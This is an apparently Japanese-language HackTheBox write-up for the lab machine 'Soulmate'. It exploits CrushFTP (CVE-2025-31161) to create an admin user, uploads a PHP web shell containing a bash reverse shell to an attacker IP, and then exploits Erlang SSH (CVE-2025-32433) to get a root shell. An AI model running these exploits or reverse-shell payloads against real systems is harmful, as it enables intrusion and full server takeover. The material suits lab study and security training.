---
title: 'Soulmate - HTB'
description: 'HackTheBox Machine SoulmateのWriteupです。'
pubDate: 2026-01-25
category: 'HTB'
tags: ['HTB', 'Machine', 'Writeup', 'Linux', 'VHOST', 'CrushFTP', 'Erlang', 'CVE-2025-31161', 'CVE-2025-32433']
---

# Soulmate - HTB

## 初期侵入
### ポートスキャン
```bash
$ nmap 10.129.231.23 -Pn -T4 -p 80 -A

PORT   STATE SERVICE VERSION
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
```
> ディレクトリ列挙やプロフィールのPHPファイルのアップロードも侵入に繋がるものはなかった

### サブドメイン列挙
```bash
gobuster vhost -u http://soulmate.htb -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt --append-domain -t 100
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                       http://soulmate.htb
[+] Method:                    GET
[+] Threads:                   100
[+] Wordlist:                  /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
[+] User Agent:                gobuster/3.8.2
[+] Timeout:                   10s
[+] Append Domain:             true
[+] Exclude Hostname Length:   false
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
ftp.soulmate.htb Status: 302 [Size: 0] [--> /WebInterface/login.html]
Progress: 5000 / 5000 (100.00%)
===============================================================
Finished
===============================================================
```
> ftpサーバーが公開されていた

### Crash FTPの脆弱性
- [CVE-2025-31161](https://github.com/Immersive-Labs-Sec/CVE-2025-31161/blob/main/cve-2025-31161.py)

```bash
$ python3 CVE-2025-31161.py --target_host ftp.soulmate.htb --port 80 --target_user crushadmin --new_user test --password test@123
[+] Preparing Payloads
  [-] Warming up the target
[+] Sending Account Create Request
  [!] User created successfully
[+] Exploit Complete you can now login with
   [*] Username: test
   [*] Password: test@123.
```
```bash
login > test:test@123
Adminパネル <http://ftp.soulmate.htb/WebInterface/admin/index.html>
UserManagerパネル <http://ftp.soulmate.htb/WebInterface/UserManager/index.html>
ben -> GenerateRandomPassword -> Save

login > ben:RMtAYq
webProd <http://ftp.soulmate.htb/#/webProd>
Addfiles
  shell.php
    <?php
      exec("bash -c 'bash -i >& /dev/tcp/10.10.14.33/4444 0>&1'");
  Upload
<http://soulmate.htb:/shell.php>
```

### サーバー内調査
> データベースにadminがあり、config.phpにpasswordが見つかった  
しかし、soulmate.htbアクセスしても特に変わったものは見つからなかった
```bash
www-data@soulmate:~/soulmate.htb$ ls data
ls data
soulmate.db
www-data@soulmate:~/soulmate.htb$ cd data
cd data
www-data@soulmate:~/soulmate.htb/data$ file soulmate.db
file soulmate.db
soulmate.db: SQLite 3.x database, last written using SQLite version 3037002, file counter 5, database pages 4, cookie 0x1, schema 4, UTF-8, version-valid-for 5
www-data@soulmate:~/soulmate.htb/data$ sqlite3 soulmate.db
sqlite3 soulmate.db
.tables
users
select * from users;
1|admin|$2y$12$u0AC6fpQu0MJt7uJ80tM.Oh4lEmCMgvBs3PwNNZIR7lor05ING3v2|1|Administrator|||||2025-08-10 13:00:08|2025-08-10 12:59:39
```
```php
// config/config.php
if ($adminCheck->fetchColumn() == 0) {
  $adminPassword = password_hash('Crush4dmin990', PASSWORD_DEFAULT);
  $adminInsert = $this->pdo->prepare("
    INSERT INTO users (username, password, is_admin, name)
    VALUES (?, ?, 1, 'Administrator')
  ");
  $adminInsert->execute(['admin', $adminPassword]);
}
```
> ローカル複数のサービスが動いている  
8080/9090/8443はCrushFTP関連
```bash
www-data@soulmate:~/soulmate.htb/public$ netstat -an | grep LISTEN
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:37923         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:42331         0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:9090          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:8443          0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN
tcp        0      0 127.0.0.1:4369          0.0.0.0:*               LISTEN
tcp6       0      0 :::80                   :::*                    LISTEN
tcp6       0      0 :::22                   :::*                    LISTEN
tcp6       0      0 ::1:4369                :::*                    LISTEN
```
> SSHだがOpenSSHではなくErlang実装だったため、既知CVEの存在を疑った  
`SSH-2.0-Erlang/5.2.9` <- 今回  
`SSH-2.0-OpenSSH_10.2p1 Debian-3` <- よく見るやつ
```bash
www-data@soulmate:/tmp$ nc 127.0.0.1 2222
nc 127.0.0.1 2222
SSH-2.0-Erlang/5.2.9
```

## root権限昇格
### SSH-2.0-Erlang/5.2.9の脆弱性
> この脆弱性を悪用するとrootのshellを取得できる
```bash
www-data@soulmate:/tmp$ python3 CVE-2025-32433.py 127.0.0.1 --check --port 2222
<hon3 CVE-2025-32433.py 127.0.0.1 --chec --port 2222
[*] Target: 127.0.0.1:2222
[*] Connecting to target...
[+] Received banner: SSH-2.0-Erlang/5.2.9
[+] Connection stayed open after channel message.
[!!] 127.0.0.1:2222 appears VULNERABLE to CVE-2025-32433
www-data@soulmate:/tmp$ python3 CVE-2025-32433.py 127.0.0.1 --port 2222 --shell --lhost 10.10.14.33 --lport 6666
```
```bash
nc -lnvp 6666
listening on [any] 6666 ...
connect to [10.10.14.33] from (UNKNOWN) [10.129.231.23] 33490
id
uid=0(root) gid=0(root) groups=0(root)
ls /root
root.txt
scripts
ls /home/ben
user.txt
```